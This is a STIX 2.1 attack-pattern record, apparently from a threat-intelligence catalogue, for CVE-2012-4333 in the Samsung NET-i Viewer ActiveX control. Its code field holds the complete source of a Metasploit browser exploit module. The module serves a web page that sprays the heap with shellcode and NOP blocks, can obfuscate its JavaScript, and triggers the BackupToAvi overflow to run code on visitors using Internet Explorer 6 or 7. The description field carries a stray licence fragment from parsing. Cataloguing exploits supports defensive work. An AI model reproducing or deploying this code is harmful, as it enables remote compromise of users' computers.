{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--dd93d3de-db52-40f5-a641-4dd60cb4e2cb",
    "created": "2024-08-14T16:41:29.913693Z",
    "modified": "2024-08-14T16:41:29.913697Z",
    "name": "\"Samsung NET-i Viewer Multiple ActiveX BackupToAvi() Remote Overflow\"",
    "description": " This module exploits a vulnerability in the CNC_Ctrl.dll ActiveX control installed with the Samsung NET-i viewer 1.37.  Specifically, when supplying a long string for the fname parameter to the BackupToAvi method, an integer overflow occurs, which leads to a posterior buffer overflow due to the use of memcpy with an incorrect size, resulting in remote code execution under the context of the user.  'License'        => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/browser/samsung_neti_wiewer_backuptoavi_bof.rb",
            "external_id": "samsung_neti_wiewer_backuptoavi_bof.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2012-4333"
        },
        {
            "source_name": "reference",
            "url": "http://aluigi.altervista.org/adv/netiware_1-adv.txt"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = NormalRanking\n\n  include Msf::Exploit::Remote::HttpServer::HTML\n\n  def initialize(info={})\n    super(update_info(info,\n      'Name'           => \"Samsung NET-i Viewer Multiple ActiveX BackupToAvi() Remote Overflow\",\n      'Description'    => %q{\n          This module exploits a vulnerability in the CNC_Ctrl.dll ActiveX control installed\n        with the Samsung NET-i viewer 1.37.\n\n        Specifically, when supplying a long string for the fname parameter to the\n        BackupToAvi method, an integer overflow occurs, which leads to a posterior buffer\n        overflow due to the use of memcpy with an incorrect size, resulting in remote code\n        execution under the context of the user.\n      },\n      'License'        => MSF_LICENSE,\n      'Author'         =>\n        [\n          'Luigi Auriemma', # Vulnerability Discovery and PoC\n          'juan vazquez' # Metasploit module\n        ],\n      'References'     =>\n        [\n          [ 'CVE', '2012-4333' ],\n          [ 'OSVDB', '81453'],\n          [ 'BID', '53193'],\n          [ 'URL', 'http://aluigi.altervista.org/adv/netiware_1-adv.txt' ]\n        ],\n      'Payload'        =>\n        {\n          'Space'           => 1024,\n          'BadChars'        => \"\\x00\"\n        },\n      'DefaultOptions'  =>\n        {\n          'EXITFUNC' => 'thread',\n          'InitialAutoRunScript' => 'post/windows/manage/priv_migrate'\n        },\n      'Platform'       => 'win',\n      'Targets'        =>\n        [\n          # Samsung NET-i viewer 1.37\n          # CNC_Ctrl.dll 1.5.1.1\n          [ 'Automatic', {} ],\n          [ 'IE 6 on Windows XP SP3',\n            {\n              'Ret' => 0x0c0c0c0c,\n              'Offset' => '0x800 - code.length',\n            }\n          ],\n          [ 'IE 7 on Windows XP SP3',\n            {\n              'Ret' => 0x0c0c0c0c,\n              'Offset' => '0x800 - code.length',\n            }\n          ]\n        ],\n      'Privileged'     => false,\n      'DisclosureDate' => '2012-04-21',\n      'DefaultTarget'  => 0))\n\n    register_options(\n      [\n        OptBool.new('OBFUSCATE', [false, 'Enable JavaScript obfuscation'])\n      ])\n  end\n\n  def get_target(agent)\n    #If the user is already specified by the user, we'll just use that\n    return target if target.name != 'Automatic'\n\n    if agent =~ /NT 5\\.1/ and agent =~ /MSIE 6/\n      return targets[1]  #IE 6 on Windows XP SP3\n    elsif agent =~ /NT 5\\.1/ and agent =~ /MSIE 7/\n      return targets[2]  #IE 7 on Windows XP SP3\n    else\n      return nil\n    end\n  end\n\n\n  def on_request_uri(cli, request)\n    agent = request.headers['User-Agent']\n    my_target = get_target(agent)\n\n    # Avoid the attack if the victim doesn't have the same setup we're targeting\n    if my_target.nil?\n      print_error(\"Browser not supported: #{agent.to_s}\")\n      send_not_found(cli)\n      return\n    end\n\n    print_status(\"Target set: #{my_target.name}\")\n\n    p = payload.encoded\n    js_code = Rex::Text.to_unescape(p, Rex::Arch.endian(my_target.arch))\n    js_nops = Rex::Text.to_unescape(\"\\x0c\"*4, Rex::Arch.endian(my_target.arch))\n    randnop = rand_text_alpha(rand(100) + 1)\n\n    js = <<-JS\n    var heap_obj = new heapLib.ie(0x20000);\n    var code = unescape(\"#{js_code}\");\n    var #{randnop} = \"#{js_nops}\";\n    var nops = unescape(#{randnop});\n\n    while (nops.length < 0x80000) nops += nops;\n    var offset = nops.substring(0, #{my_target['Offset']});\n    var shellcode = offset + code + nops.substring(0, 0x800-code.length-offset.length);\n\n    while (shellcode.length < 0x40000) shellcode += shellcode;\n    var block = shellcode.substring(0, (0x80000-6)/2);\n\n    heap_obj.gc();\n\n    for (var i=1; i < 0x200; i++) {\n      heap_obj.alloc(block);\n    }\n    JS\n\n    js = heaplib(js, {:noobfu => true})\n\n    #obfuscate on demand\n    if datastore['OBFUSCATE']\n      js = ::Rex::Exploitation::JSObfu.new(js)\n      js.obfuscate(memory_sensitive: true)\n    end\n\n    bof = Rex::Text.to_unescape(\"\\x0c\" * 2048, Rex::Arch.endian(my_target.arch))\n\n    html = <<-EOS\n    <html>\n    <head>\n    <script>\n    #{js}\n    </script>\n    </head>\n    <body>\n    <object id=\"target1\" classid=\"CLSID:3D6F2DBA-F4E5-40A6-8725-E99BC96CC23A\"></object>\n    <script>\n      target1.BackupToAvi(0, 0, 0, unescape(\"#{bof}\"));\n    </script>\n    <body>\n    </html>\n    EOS\n\n    html = html.gsub(/^ {4}/, '')\n\n    print_status(\"Sending html\")\n    send_response(cli, html, {'Content-Type'=>'text/html'})\n\n  end\nend\n\n",
    "x_mitre_disclosure_date": "2012-04-21",
    "x_mitre_platforms": [
        "win'"
    ]
}